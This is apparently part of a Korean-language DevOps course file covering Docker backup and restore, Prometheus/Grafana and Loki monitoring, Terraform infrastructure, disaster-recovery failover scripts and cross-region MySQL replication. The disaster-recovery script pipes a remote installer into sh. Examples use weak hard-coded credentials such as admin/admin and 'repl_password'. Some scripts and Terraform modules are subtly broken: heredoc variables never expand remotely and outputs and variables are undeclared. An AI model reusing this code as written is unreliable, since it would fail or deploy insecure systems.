+\`\`\`
+
+**Cron 설정** (매일 새벽 3시):
+\`\`\`bash
+# backup 컨테이너 내부의 /etc/crontabs/root
+0 3 * * * /backup.sh >> /var/log/backup.log 2>&1
+\`\`\`
+
+**복구 스크립트 (restore.sh)**:
+\`\`\`bash
+#!/bin/bash
+set -e
+
+BACKUP_FILE=$1
+
+if [ -z "\$BACKUP_FILE" ]; then
+  echo "Usage: ./restore.sh <backup_file.tar.gz>"
+  exit 1
+fi
+
+echo "⚠️  WARNING: This will restore infrastructure from backup!"
+read -p "Continue? (yes/no): " confirm
+
+if [ "\$confirm" != "yes" ]; then
+  exit 0
+fi
+
+# 1. 기존 스택 중단
+echo "🛑 Stopping current stack..."
+docker-compose down
+
+# 2. 백업 압축 해제
+echo "📦 Extracting backup..."
+tar xzf \$BACKUP_FILE -C /tmp/
+
+BACKUP_DIR=\$(tar tzf \$BACKUP_FILE | head -1 | cut -f1 -d"/")
+
+# 3. 설정 파일 복원
+echo "📄 Restoring configs..."
+cp /tmp/\${BACKUP_DIR}/docker-compose.yml ./
+cp /tmp/\${BACKUP_DIR}/.env ./
+
+# 4. MySQL 복원
+echo "💾 Restoring MySQL..."
+docker-compose up -d db
+sleep 10
+gunzip < /tmp/\${BACKUP_DIR}/mysql_*.sql.gz | \\
+  docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}
+
+# 5. Redis 복원
+echo "📦 Restoring Redis..."
+docker cp /tmp/\${BACKUP_DIR}/redis_*.rdb redis:/data/dump.rdb
+docker-compose restart redis
+
+# 6. 전체 스택 재시작
+echo "🚀 Starting full stack..."
+docker-compose up -d
+
+echo "✅ Restore completed!"
+\`\`\``,
+                  checklist: [
+                    "backup-compose.yml 생성하고 백업 서비스 실행",
+                    "backup.sh 스크립트 작성 후 수동 실행으로 테스트",
+                    "S3 버킷 생성 및 AWS 자격 증명 설정",
+                    "Cron으로 매일 자동 백업 설정",
+                    "restore.sh로 백업 파일 하나 선택해서 복구 테스트"
+                  ]
+                },
+                {
+                  subtitle: "2. Prometheus + Grafana 모니터링 통합",
+                  content: `Docker Compose에 모니터링 스택을 통합하여 인프라 전체를 모니터링합니다.
+
+**monitoring-compose.yml**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  # Prometheus (메트릭 수집)
+  prometheus:
+    image: prom/prometheus:latest
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml
+      - prometheus-data:/prometheus
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.retention.time=30d'
+    ports:
+      - "9090:9090"
+    networks:
+      - monitoring
+
+  # Grafana (시각화)
+  grafana:
+    image: grafana/grafana:latest
+    volumes:
+      - grafana-data:/var/lib/grafana
+      - ./grafana/provisioning:/etc/grafana/provisioning
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=admin
+      - GF_USERS_ALLOW_SIGN_UP=false
+    ports:
+      - "3001:3000"
+    networks:
+      - monitoring
+    depends_on:
+      - prometheus
+
+  # Node Exporter (호스트 메트릭)
+  node-exporter:
+    image: prom/node-exporter:latest
+    volumes:
+      - /proc:/host/proc:ro
+      - /sys:/host/sys:ro
+      - /:/rootfs:ro
+    command:
+      - '--path.procfs=/host/proc'
+      - '--path.sysfs=/host/sys'
+      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)(\$\$|/)'
+    ports:
+      - "9100:9100"
+    networks:
+      - monitoring
+
+  # cAdvisor (컨테이너 메트릭)
+  cadvisor:
+    image: gcr.io/cadvisor/cadvisor:latest
+    volumes:
+      - /:/rootfs:ro
+      - /var/run:/var/run:ro
+      - /sys:/sys:ro
+      - /var/lib/docker/:/var/lib/docker:ro
+    ports:
+      - "8080:8080"
+    networks:
+      - monitoring
+
+  # MySQL Exporter (DB 메트릭)
+  mysql-exporter:
+    image: prom/mysqld-exporter:latest
+    environment:
+      - DATA_SOURCE_NAME=exporter:password@(db:3306)/
+    ports:
+      - "9104:9104"
+    networks:
+      - monitoring
+      - app-network
+
+  # Redis Exporter (캐시 메트릭)
+  redis-exporter:
+    image: oliver006/redis_exporter:latest
+    environment:
+      - REDIS_ADDR=redis:6379
+    ports:
+      - "9121:9121"
+    networks:
+      - monitoring
+      - app-network
+
+volumes:
+  prometheus-data:
+  grafana-data:
+
+networks:
+  monitoring:
+    driver: bridge
+  app-network:
+    external: true
+\`\`\`
+
+**prometheus.yml** (Prometheus 설정):
+\`\`\`yaml
+global:
+  scrape_interval: 15s
+  evaluation_interval: 15s
+
+scrape_configs:
+  # Prometheus 자체 모니터링
+  - job_name: 'prometheus'
+    static_configs:
+      - targets: ['localhost:9090']
+
+  # 호스트 메트릭
+  - job_name: 'node-exporter'
+    static_configs:
+      - targets: ['node-exporter:9100']
+
+  # 컨테이너 메트릭
+  - job_name: 'cadvisor'
+    static_configs:
+      - targets: ['cadvisor:8080']
+
+  # MySQL 메트릭
+  - job_name: 'mysql'
+    static_configs:
+      - targets: ['mysql-exporter:9104']
+
+  # Redis 메트릭
+  - job_name: 'redis'
+    static_configs:
+      - targets: ['redis-exporter:9121']
+
+  # 애플리케이션 메트릭 (Node.js prom-client)
+  - job_name: 'app'
+    static_configs:
+      - targets: ['web:3000']
+    metrics_path: '/metrics'
+\`\`\`
+
+**전체 스택 실행**:
+\`\`\`bash
+# 앱 + 모니터링 동시 실행
+docker-compose -f docker-compose.yml -f monitoring-compose.yml up -d
+
+# Grafana 접속: http://localhost:3001
+# 기본 로그인: admin / admin
+
+# Prometheus 쿼리 예시
+# - 컨테이너 CPU: container_cpu_usage_seconds_total
+# - MySQL 쿼리 수: mysql_global_status_queries
+# - Redis 메모리: redis_memory_used_bytes
+\`\`\``,
+                  checklist: [
+                    "monitoring-compose.yml 생성하고 모니터링 스택 실행",
+                    "Prometheus UI(9090)에서 모든 타겟이 UP 상태인지 확인",
+                    "Grafana(3001)에서 Prometheus 데이터소스 추가",
+                    "Grafana에서 Docker Dashboard 임포트 (ID: 179, 193)",
+                    "앱에 부하를 주고 CPU/메모리 메트릭 실시간 확인"
+                  ]
+                },
+                {
+                  subtitle: "3. 로그 중앙화 (Loki + Promtail)",
+                  content: `모든 컨테이너 로그를 Loki에 수집하고 Grafana에서 통합 조회합니다.
+
+**logging-compose.yml**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  # Loki (로그 저장소)
+  loki:
+    image: grafana/loki:latest
+    ports:
+      - "3100:3100"
+    volumes:
+      - ./loki-config.yml:/etc/loki/local-config.yaml
+      - loki-data:/loki
+    command: -config.file=/etc/loki/local-config.yaml
+    networks:
+      - monitoring
+
+  # Promtail (로그 수집 에이전트)
+  promtail:
+    image: grafana/promtail:latest
+    volumes:
+      - /var/log:/var/log:ro
+      - /var/lib/docker/containers:/var/lib/docker/containers:ro
+      - ./promtail-config.yml:/etc/promtail/config.yml
+    command: -config.file=/etc/promtail/config.yml
+    networks:
+      - monitoring
+
+volumes:
+  loki-data:
+
+networks:
+  monitoring:
+    external: true
+\`\`\`
+
+**loki-config.yml**:
+\`\`\`yaml
+auth_enabled: false
+
+server:
+  http_listen_port: 3100
+
+ingester:
+  lifecycler:
+    ring:
+      kvstore:
+        store: inmemory
+      replication_factor: 1
+
+schema_config:
+  configs:
+    - from: 2024-01-01
+      store: boltdb-shipper
+      object_store: filesystem
+      schema: v11
+      index:
+        prefix: index_
+        period: 24h
+
+storage_config:
+  boltdb_shipper:
+    active_index_directory: /loki/index
+    cache_location: /loki/cache
+  filesystem:
+    directory: /loki/chunks
+
+limits_config:
+  retention_period: 168h  # 7일 보관
+\`\`\`
+
+**promtail-config.yml**:
+\`\`\`yaml
+server:
+  http_listen_port: 9080
+
+positions:
+  filename: /tmp/positions.yaml
+
+clients:
+  - url: http://loki:3100/loki/api/v1/push
+
+scrape_configs:
+  # Docker 컨테이너 로그 수집
+  - job_name: docker
+    static_configs:
+      - targets:
+          - localhost
+        labels:
+          job: docker
+          __path__: /var/lib/docker/containers/*/*.log
+    pipeline_stages:
+      - json:
+          expressions:
+            output: log
+            stream: stream
+            container_name: attrs.name
+      - labels:
+          container_name:
+          stream:
+      - output:
+          source: output
+\`\`\`
+
+**Grafana에서 Loki 연동**:
+\`\`\`bash
+# Grafana Data Source 추가
+# URL: http://loki:3100
+
+# LogQL 쿼리 예시
+{container_name="web"} |= "ERROR"
+{container_name="db"} |= "slow query"
+{job="docker"} | json | line_format "{{.container_name}}: {{.log}}"
+\`\`\``,
+                  checklist: [
+                    "logging-compose.yml 생성하고 Loki + Promtail 실행",
+                    "Grafana에서 Loki 데이터소스 추가 (http://loki:3100)",
+                    "Explore 탭에서 {container_name=\"web\"} 쿼리로 로그 확인",
+                    "에러 로그만 필터링하는 쿼리 작성 (|= \"ERROR\")",
+                    "로그 + 메트릭 통합 대시보드 생성 (CPU 높을 때 로그 연동)"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: Terraform으로 인프라 코드화 및 재해 복구",
+              sections: [
+                {
+                  subtitle: "1. Terraform으로 CapRover 인프라 관리",
+                  content: `Terraform을 사용해 CapRover 서버와 Docker 리소스를 코드로 관리합니다.
+
+**프로젝트 구조**:
+\`\`\`
+terraform/
+├── main.tf              # 메인 설정
+├── variables.tf         # 변수 정의
+├── outputs.tf          # 출력값
+├── provider.tf         # 프로바이더 설정
+├── modules/
+│   ├── caprover/       # CapRover 모듈
+│   ├── docker/         # Docker 리소스 모듈
+│   └── monitoring/     # 모니터링 스택 모듈
+└── environments/
+    ├── dev.tfvars
+    ├── staging.tfvars
+    └── prod.tfvars
+\`\`\`
+
+**provider.tf** (Docker Provider 사용):
+\`\`\`hcl
+terraform {
+  required_providers {
+    docker = {
+      source  = "kreuzwerker/docker"
+      version = "~> 3.0"
+    }
+  }
+
+  # 상태 저장소 (S3 백엔드)
+  backend "s3" {
+    bucket = "my-terraform-state"
+    key    = "caprover/terraform.tfstate"
+    region = "ap-northeast-2"
+  }
+}
+
+provider "docker" {
+  host = "unix:///var/run/docker.sock"
+}
+\`\`\`
+
+**main.tf** (Docker 네트워크 및 볼륨):
+\`\`\`hcl
+# Docker 네트워크
+resource "docker_network" "app_network" {
+  name   = "app-network"
+  driver = "bridge"
+}
+
+# MySQL 볼륨
+resource "docker_volume" "mysql_data" {
+  name = "mysql-data"
+}
+
+# Redis 볼륨
+resource "docker_volume" "redis_data" {
+  name = "redis-data"
+}
+
+# MySQL 컨테이너
+resource "docker_container" "mysql" {
+  name  = "mysql"
+  image = docker_image.mysql.image_id
+
+  env = [
+    "MYSQL_ROOT_PASSWORD=\${var.mysql_root_password}",
+    "MYSQL_DATABASE=\${var.mysql_database}"
+  ]
+
+  volumes {
+    volume_name    = docker_volume.mysql_data.name
+    container_path = "/var/lib/mysql"
+  }
+
+  networks_advanced {
+    name = docker_network.app_network.name
+  }
+
+  restart = "unless-stopped"
+
+  healthcheck {
+    test     = ["CMD", "mysqladmin", "ping", "-h", "localhost"]
+    interval = "10s"
+    timeout  = "5s"
+    retries  = 5
+  }
+}
+
+# Redis 컨테이너
+resource "docker_container" "redis" {
+  name  = "redis"
+  image = docker_image.redis.image_id
+
+  volumes {
+    volume_name    = docker_volume.redis_data.name
+    container_path = "/data"
+  }
+
+  networks_advanced {
+    name = docker_network.app_network.name
+  }
+
+  restart = "unless-stopped"
+}
+
+# 웹 애플리케이션 컨테이너
+resource "docker_container" "web" {
+  name  = "web"
+  image = docker_image.app.image_id
+
+  env = [
+    "NODE_ENV=\${var.environment}",
+    "DB_HOST=mysql",
+    "REDIS_HOST=redis"
+  ]
+
+  ports {
+    internal = 3000
+    external = var.app_port
+  }
+
+  networks_advanced {
+    name = docker_network.app_network.name
+  }
+
+  depends_on = [
+    docker_container.mysql,
+    docker_container.redis
+  ]
+
+  restart = "unless-stopped"
+}
+
+# Docker 이미지
+resource "docker_image" "mysql" {
+  name = "mysql:8.0"
+}
+
+resource "docker_image" "redis" {
+  name = "redis:7-alpine"
+}
+
+resource "docker_image" "app" {
+  name = "\${var.app_image}:\${var.app_version}"
+}
+\`\`\`
+
+**variables.tf**:
+\`\`\`hcl
+variable "environment" {
+  description = "Environment name"
+  type        = string
+  default     = "production"
+}
+
+variable "mysql_root_password" {
+  description = "MySQL root password"
+  type        = string
+  sensitive   = true
+}
+
+variable "mysql_database" {
+  description = "MySQL database name"
+  type        = string
+  default     = "myapp"
+}
+
+variable "app_image" {
+  description = "Application Docker image"
+  type        = string
+}
+
+variable "app_version" {
+  description = "Application version tag"
+  type        = string
+  default     = "latest"
+}
+
+variable "app_port" {
+  description = "Application external port"
+  type        = number
+  default     = 3000
+}
+\`\`\`
+
+**environments/prod.tfvars**:
+\`\`\`hcl
+environment   = "production"
+app_image     = "myregistry/myapp"
+app_version   = "v1.2.3"
+app_port      = 80
+mysql_database = "myapp_prod"
+\`\`\`
+
+**Terraform 실행**:
+\`\`\`bash
+# 초기화
+terraform init
+
+# 계획 확인
+terraform plan -var-file=environments/prod.tfvars
+
+# 적용
+terraform apply -var-file=environments/prod.tfvars
+
+# 특정 리소스만 재생성
+terraform taint docker_container.web
+terraform apply
+
+# 전체 인프라 제거
+terraform destroy -var-file=environments/prod.tfvars
+\`\`\``,
+                  checklist: [
+                    "Terraform 설치 및 provider.tf 작성",
+                    "main.tf에 Docker 네트워크/볼륨/컨테이너 정의",
+                    "terraform plan으로 변경 사항 미리보기",
+                    "terraform apply로 인프라 프로비저닝",
+                    "웹 컨테이너 설정 변경 후 terraform apply로 무중단 업데이트"
+                  ]
+                },
+                {
+                  subtitle: "2. 재해 복구 계획 (Disaster Recovery)",
+                  content: `전체 인프라를 다른 리전/서버에 빠르게 복구하는 자동화 시스템을 구축합니다.
+
+**DR(재해 복구) 전략 - RTO/RPO 정의**:
+- **RTO (Recovery Time Objective)**: 목표 복구 시간 - 30분
+- **RPO (Recovery Point Objective)**: 목표 복구 시점 - 15분
+
+**dr-plan.sh** (재해 복구 자동화):
+\`\`\`bash
+#!/bin/bash
+set -e
+
+DR_REGION="us-west-2"  # Primary: ap-northeast-2
+DR_SERVER="dr-server.example.com"
+BACKUP_BUCKET="s3://my-dr-backups"
+
+echo "🚨 Starting Disaster Recovery Process..."
+
+# 1. 최신 백업 확인
+echo "📦 Finding latest backup..."
+LATEST_BACKUP=\$(aws s3 ls \${BACKUP_BUCKET}/infra/ | sort | tail -n 1 | awk '{print $4}')
+
+if [ -z "\$LATEST_BACKUP" ]; then
+  echo "❌ No backup found!"
+  exit 1
+fi
+
+echo "✅ Latest backup: \$LATEST_BACKUP"
+
+# 2. DR 서버에 SSH 접속하여 복구 시작
+echo "🔗 Connecting to DR server..."
+ssh ubuntu@\${DR_SERVER} << 'EOF'
+  # Docker 설치 확인
+  if ! command -v docker &> /dev/null; then
+    echo "Installing Docker..."
+    curl -fsSL https://get.docker.com | sh
+    sudo usermod -aG docker ubuntu
+  fi
+
+  # Terraform 설치 확인
+  if ! command -v terraform &> /dev/null; then
+    echo "Installing Terraform..."
+    wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
+    unzip terraform_1.6.0_linux_amd64.zip
+    sudo mv terraform /usr/local/bin/
+  fi
+
+  # 백업 다운로드
+  aws s3 cp \${BACKUP_BUCKET}/infra/\${LATEST_BACKUP} ./backup.tar.gz
+
+  # 백업 압축 해제
+  tar xzf backup.tar.gz
+
+  # Terraform 상태 복구
+  cd terraform
+  terraform init -backend-config="bucket=my-dr-terraform-state"
+  terraform apply -auto-approve -var-file=environments/dr.tfvars
+
+  # Docker Compose로 서비스 시작
+  docker-compose -f docker-compose.yml up -d
+
+  # 데이터베이스 복구
+  gunzip < backup/mysql_*.sql.gz | docker exec -i mysql mysql -u root -p\${MYSQL_ROOT_PASSWORD}
+
+  # Health Check
+  echo "🏥 Running health checks..."
+  sleep 30
+  curl -f http://localhost/health || exit 1
+
+  echo "✅ DR recovery completed!"
+EOF
+
+# 3. DNS 업데이트 (Route53)
+echo "🌐 Updating DNS to DR server..."
+aws route53 change-resource-record-sets \\
+  --hosted-zone-id Z1234567890ABC \\
+  --change-batch '{
+    "Changes": [{
+      "Action": "UPSERT",
+      "ResourceRecordSet": {
+        "Name": "app.example.com",
+        "Type": "A",
+        "TTL": 60,
+        "ResourceRecords": [{"Value": "'$(dig +short ${DR_SERVER})'"}]
+      }
+    }]
+  }'
+
+# 4. Slack 알림
+curl -X POST \${SLACK_WEBHOOK_URL} \\
+  -H 'Content-Type: application/json' \\
+  -d '{
+    "text": "🚨 Disaster Recovery activated! Services running on DR server.",
+    "attachments": [{
+      "color": "warning",
+      "fields": [
+        {"title": "Backup Used", "value": "'\${LATEST_BACKUP}'", "short": true},
+        {"title": "DR Server", "value": "'\${DR_SERVER}'", "short": true}
+      ]
+    }]
+  }'
+
+echo "✅ Disaster Recovery completed successfully!"
+echo "🌐 Services now running on: \${DR_SERVER}"
+\`\`\`
+
+**DR 테스트 자동화** (매월 실행):
+\`\`\`bash
+#!/bin/bash
+# dr-test.sh - 재해 복구 훈련
+
+echo "🧪 Starting DR Test (non-destructive)..."
+
+# 1. 테스트용 DR 서버 프로비저닝 (Terraform)
+cd terraform
+terraform workspace new dr-test
+terraform apply -auto-approve -var-file=environments/dr-test.tfvars
+
+# 2. 최신 백업으로 복구 테스트
+./dr-plan.sh --test-mode
+
+# 3. 성능 테스트 (k6)
+k6 run --vus 100 --duration 5m load-test.js
+
+# 4. 결과 리포트 생성
+cat > dr-test-report.md << EOF
+# DR Test Report - \$(date +%Y-%m-%d)
+
+## Summary
+- **RTO Achieved**: \${RTO_MINUTES} minutes
+- **RPO Achieved**: \${RPO_MINUTES} minutes
+- **Performance**: \${PERFORMANCE_SCORE}/100
+
+## Services Status
+- Web: ✅ Healthy
+- Database: ✅ Healthy
+- Cache: ✅ Healthy
+
+## Recommendations
+- Update DNS TTL to 60 seconds for faster failover
+- Increase backup frequency to every 10 minutes
+EOF
+
+# 5. 테스트 환경 정리
+terraform workspace select default
+terraform destroy -auto-approve
+
+echo "✅ DR Test completed. Report: dr-test-report.md"
+\`\`\`
+
+**자동 페일오버 (Health Check 기반)**:
+\`\`\`bash
+#!/bin/bash
+# auto-failover.sh - Cron으로 매분 실행
+
+PRIMARY_URL="https://app.example.com/health"
+DR_TRIGGER_THRESHOLD=3  # 3번 연속 실패 시 DR 발동
+
+FAIL_COUNT=\$(cat /tmp/fail_count 2>/dev/null || echo 0)
+
+if ! curl -sf \${PRIMARY_URL} > /dev/null; then
+  FAIL_COUNT=$((FAIL_COUNT + 1))
+  echo \${FAIL_COUNT} > /tmp/fail_count
+
+  if [ \${FAIL_COUNT} -ge \${DR_TRIGGER_THRESHOLD} ]; then
+    echo "🚨 PRIMARY DOWN! Triggering DR..."
+    ./dr-plan.sh
+    echo 0 > /tmp/fail_count
+  fi
+else
+  echo 0 > /tmp/fail_count
+fi
+\`\`\``,
+                  checklist: [
+                    "dr-plan.sh 스크립트 작성하고 DR 서버 정보 설정",
+                    "AWS Route53에 도메인 등록 및 DNS 업데이트 테스트",
+                    "dr-test.sh로 월간 DR 훈련 실행 (RTO/RPO 측정)",
+                    "auto-failover.sh를 Cron에 등록 (* * * * *)",
+                    "Primary 서버를 일부러 중단시켜 자동 페일오버 동작 확인"
+                  ]
+                },
+                {
+                  subtitle: "3. Multi-Region 인프라 자동 복제",
+                  content: `Terraform을 사용해 여러 리전에 동일한 인프라를 자동으로 배포합니다.
+
+**multi-region 구조**:
+\`\`\`
+terraform/
+├── global/
+│   ├── route53.tf        # 글로벌 DNS
+│   └── s3-backend.tf     # Terraform 상태 저장소
+├── regions/
+│   ├── ap-northeast-2/   # 서울 (Primary)
+│   ├── us-west-2/        # 오리건 (DR)
+│   └── ap-southeast-1/   # 싱가포르 (CDN Edge)
+└── modules/
+    └── app-stack/        # 재사용 가능한 앱 스택
+\`\`\`
+
+**modules/app-stack/main.tf** (재사용 모듈):
+\`\`\`hcl
+variable "region" {
+  type = string
+}
+
+variable "environment" {
+  type = string
+}
+
+# Docker 네트워크
+resource "docker_network" "app" {
+  name = "\${var.environment}-app-network"
+}
+
+# MySQL
+resource "docker_container" "mysql" {
+  name  = "\${var.environment}-mysql"
+  image = "mysql:8.0"
+
+  env = [
+    "MYSQL_ROOT_PASSWORD=\${var.mysql_password}",
+    "MYSQL_DATABASE=\${var.db_name}"
+  ]
+
+  # 리전별 볼륨
+  volumes {
+    volume_name    = "\${var.environment}-mysql-data"
+    container_path = "/var/lib/mysql"
+  }
+
+  networks_advanced {
+    name = docker_network.app.name
+  }
+}
+
+# 웹 앱
+resource "docker_container" "web" {
+  name  = "\${var.environment}-web"
+  image = "myapp:\${var.app_version}"
+
+  ports {
+    internal = 3000
+    external = 80
+  }
+
+  networks_advanced {
+    name = docker_network.app.name
+  }
+
+  depends_on = [docker_container.mysql]
+}
+
+output "web_url" {
+  value = "http://\${var.region}.example.com"
+}
+\`\`\`
+
+**regions/ap-northeast-2/main.tf** (서울 리전):
+\`\`\`hcl
+module "seoul_stack" {
+  source = "../../modules/app-stack"
+
+  region      = "ap-northeast-2"
+  environment = "seoul-prod"
+  app_version = "v1.2.3"
+  mysql_password = var.mysql_password
+  db_name     = "myapp_seoul"
+}
+
+output "seoul_url" {
+  value = module.seoul_stack.web_url
+}
+\`\`\`
+
+**regions/us-west-2/main.tf** (오리건 DR):
+\`\`\`hcl
+module "oregon_stack" {
+  source = "../../modules/app-stack"
+
+  region      = "us-west-2"
+  environment = "oregon-dr"
+  app_version = "v1.2.3"
+  mysql_password = var.mysql_password
+  db_name     = "myapp_oregon"
+}
+
+output "oregon_url" {
+  value = module.oregon_stack.web_url
+}
+\`\`\`
+
+**global/route53.tf** (지리적 라우팅):
+\`\`\`hcl
+resource "aws_route53_zone" "main" {
+  name = "example.com"
+}
+
+# 서울 리전 레코드
+resource "aws_route53_record" "seoul" {
+  zone_id = aws_route53_zone.main.zone_id
+  name    = "app.example.com"
+  type    = "A"
+  ttl     = 60
+
+  set_identifier = "Seoul"
+  geolocation_routing_policy {
+    continent = "AS"
+  }
+
+  records = [module.seoul_stack.public_ip]
+}
+
+# 오리건 리전 레코드
+resource "aws_route53_record" "oregon" {
+  zone_id = aws_route53_zone.main.zone_id
+  name    = "app.example.com"
+  type    = "A"
+  ttl     = 60
+
+  set_identifier = "Oregon"
+  geolocation_routing_policy {
+    continent = "NA"
+  }
+
+  records = [module.oregon_stack.public_ip]
+
+  # Health Check 연동
+  health_check_id = aws_route53_health_check.oregon.id
+}
+
+# Health Check
+resource "aws_route53_health_check" "oregon" {
+  fqdn              = module.oregon_stack.web_url
+  port              = 80
+  type              = "HTTP"
+  resource_path     = "/health"
+  failure_threshold = 3
+  request_interval  = 30
+
+  tags = {
+    Name = "Oregon Health Check"
+  }
+}
+\`\`\`
+
+**전체 리전 배포 스크립트**:
+\`\`\`bash
+#!/bin/bash
+# deploy-all-regions.sh
+
+REGIONS=("ap-northeast-2" "us-west-2" "ap-southeast-1")
+
+for REGION in "\${REGIONS[@]}"; do
+  echo "🌏 Deploying to \$REGION..."
+
+  cd regions/\$REGION
+  terraform init
+  terraform apply -auto-approve -var-file=../../environments/prod.tfvars
+
+  # Health Check
+  HEALTH_URL=\$(terraform output -raw web_url)/health
+  curl -f \$HEALTH_URL || echo "⚠️  \$REGION health check failed!"
+
+  cd ../..
+done
+
+# 글로벌 DNS 업데이트
+echo "🌐 Updating global DNS..."
+cd global
+terraform init
+terraform apply -auto-approve
+
+echo "✅ Multi-region deployment completed!"
+\`\`\`
+
+**데이터베이스 복제 (Primary → DR)**:
+\`\`\`bash
+#!/bin/bash
+# db-replication.sh - 서울 → 오리건 실시간 복제
+
+PRIMARY_DB="seoul-mysql"
+DR_DB="oregon-mysql"
+
+# Binary Log 기반 복제 설정
+docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
+  CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
+  GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
+  FLUSH PRIVILEGES;
+  SHOW MASTER STATUS;
+"
+
+# DR에서 복제 시작
+MASTER_LOG_FILE=\$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $1}')
+MASTER_LOG_POS=\$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $2}')
+
+docker exec \${DR_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
+  CHANGE MASTER TO
+    MASTER_HOST='primary-server.example.com',
+    MASTER_USER='repl',
+    MASTER_PASSWORD='repl_password',
+    MASTER_LOG_FILE='\${MASTER_LOG_FILE}',
+    MASTER_LOG_POS=\${MASTER_LOG_POS};
+  START SLAVE;
+  SHOW SLAVE STATUS\\G;
+"
+
+echo "✅ Cross-region replication configured!"
+\`\`\``,
+                  checklist: [
+                    "modules/app-stack/ 디렉토리에 재사용 가능한 모듈 작성",
+                    "3개 리전(서울/오리건/싱가포르)에 각각 스택 배포",
+                    "Route53에서 Geolocation 라우팅 설정 (아시아→서울, 미국→오리건)",
+                    "db-replication.sh로 서울→오리건 DB 실시간 복제 설정",
+                    "VPN으로 미국 IP 사용해서 오리건 서버로 라우팅되는지 확인"
+                  ]
+                }
+              ]
+            }
+          }
         }
       ]
     }
